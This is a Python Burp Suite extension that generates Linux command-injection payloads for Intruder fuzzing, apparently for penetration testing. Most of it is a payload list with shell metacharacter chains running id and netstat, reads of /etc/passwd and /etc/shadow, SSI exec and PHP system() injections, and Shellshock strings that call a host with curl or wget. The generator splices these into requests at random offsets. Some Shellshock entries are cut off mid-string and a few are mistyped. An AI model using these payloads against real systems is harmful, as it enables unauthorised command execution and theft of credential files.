from burp import IBurpExtender
from burp import IIntruderPayloadGeneratorFactory
from burp import IIntruderPayloadGenerator
from java.util import List, ArrayList

import random

try_num = 30
payload_list = [
    "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;",
    "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;",
    "&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;",
    "&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;",
    "/index.html|id|",
    ";id;",
    ";id",
    ";netstat -a;",
    ";system('cat%20/etc/passwd')",
    ";id;",
    "|id",
    "|/usr/bin/id",
    "|id|",
    "|/usr/bin/id|",
    "||/usr/bin/id|",
    "|id;",
    "||/usr/bin/id;",
    ";id|",
    ";|/usr/bin/id|",
    "\n/bin/ls -al\n",
    "\n/usr/bin/id\n",
    "\nid\n",
    "\n/usr/bin/id;",
    "\nid;",
    "\n/usr/bin/id|",
    "\nid|",
    ";/usr/bin/id\n",
    ";id\n",
    "|usr/bin/id\n",
    "|nid\n",
    "`id`",
    "`/usr/bin/id`",
    "a);id",
    "a;id",
    "a);id;",
    "a;id;",
    "a);id|",
    "a;id|",
    "a)|id",
    "a|id",
    "a)|id;",
    "a|id",
    "|/bin/ls -al",
    "a);/usr/bin/id",
    "a;/usr/bin/id",
    "a);/usr/bin/id;",
    "a;/usr/bin/id;",
    "a);/usr/bin/id|",
    "a;/usr/bin/id|",
    "a)|/usr/bin/id",
    "a|/usr/bin/id",
    "a)|/usr/bin/id;",
    "a|/usr/bin/id",
    ";system('cat%20/etc/passwd')",
    ";system('id')",
    ";system('/usr/bin/id')",
    "%0Acat%20/etc/passwd",
    "%0A/usr/bin/id",
    "%0Aid",
    "%0A/usr/bin/id%0A",
    "%0Aid%0A",
    "& ping -i 30 127.0.0.1 &",
    "& ping -n 30 127.0.0.1 &",
    "%0a ping -i 30 127.0.0.1 %0a",
    "`ping 127.0.0.1`",
    "| id",
    "& id",
    "; id",
    "%0a id %0a",
    "`id`",
    "$;/usr/bin/id",
    '() { :;}; /bin/bash -c "curl http://127.0.0.1/',
    '() { :;}; /bin/bash -c "curl http://127.0.0.1/',
    '() { :;}; /bin/bash -c "curl http://127.0.0.1/',
    '() { :;}; /bin/bash -c "curl http://127.0.0.1/',
    '() { :;}; /bin/bash -c "curl http://127.0.0.1/',
    '() { :;}; /bin/bash -c "curl http://127.0.0.1/',
    '() { :;}; /bin/bash -c "curl http://127.0.0.1/',
    '() { :;}; /bin/bash -c "sleep 1 && curl http://127.0.0.1/',
    '() { :;}; /bin/bash -c "sleep 1 && echo vulnerable 1"',
    '() { :;}; /bin/bash -c "sleep 3 && curl http://127.0.0.1/',
    '() { :;}; /bin/bash -c "sleep 3 && echo vulnerable 3"',
    '() { :;}; /bin/bash -c "sleep 6 && curl http://127.0.0.1/',
    '() { :;}; /bin/bash -c "sleep 6 && curl http://127.0.0.1/',
    '() { :;}; /bin/bash -c "sleep 6 && echo vulnerable 6"',
    '() { :;}; /bin/bash -c "wget http://127.0.0.1/',
    '() { :;}; /bin/bash -c "wget http://127.0.0.1/',
    '() { :;}; /bin/bash -c "wget http://127.0.0.1/',
    '() { :;}; /bin/bash -c "wget http://127.0.0.1/',
    '() { :;}; /bin/bash -c "wget http://127.0.0.1/',
    '() { :;}; /bin/bash -c "wget http://127.0.0.1/',
    '() { :;}; /bin/bash -c "wget http://127.0.0.1/',
    "cat /etc/hosts",
    "$(`cat /etc/passwd`)",
    "cat /etc/passwd",
    "%0Acat%20/etc/passwd",
    '{{ get_user_file("/etc/passwd") }}',
    '<!--#exec cmd="/bin/cat /etc/passwd"-->',
    '<!--#exec cmd="/bin/cat /etc/shadow"-->',
    '<!--#exec cmd="/usr/bin/id;-->',
    "system('cat /etc/passwd');",
    '<?php system("cat /etc/passwd");?>',
]

class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()

        callbacks.registerIntruderPayloadGeneratorFactory(self)
        return
    
    def getGeneratorName(self):
        return "Linux cmd Injection Payload Generator"

    def createNewInstance(self, attack):
        return BurpFuzzer(self, attack)


class BurpFuzzer(IIntruderPayloadGenerator):
    def __init__(self, extender, attack):
        self._extender = extender
        self._helpers = extender._helpers
        self._attack = attack
        self.max_payloads = try_num
        self.num_iterations = 0
        self.num_tried = list()

        return
    
    def hasMorePayloads(self):
        if (self.num_iterations == self.max_payloads) or (len(self.num_tried) == len(payload_list)):
            return False
        else:
            return True
    
    def getNextPayload(self, current_payload):
        payload = ''.join(chr(x) for x in current_payload)

        payload = self.mutate_payload(payload)

        self.num_iterations += 1

        return payload
    
    def reset(self):
        self.num_iterations = 0
        return
    
    def mutate_payload(self, original_payload):
        offset = random.randint(0, len(original_payload) - 1)
        front, back = original_payload[:offset], original_payload[offset:]
        
        
        while True:
            sample_number = random.randint(0, len(payload_list) -1)
            if sample_number not in self.num_tried:
                    self.num_tried.append(sample_number)
                    break
        front += payload_list[sample_number]

        return front + back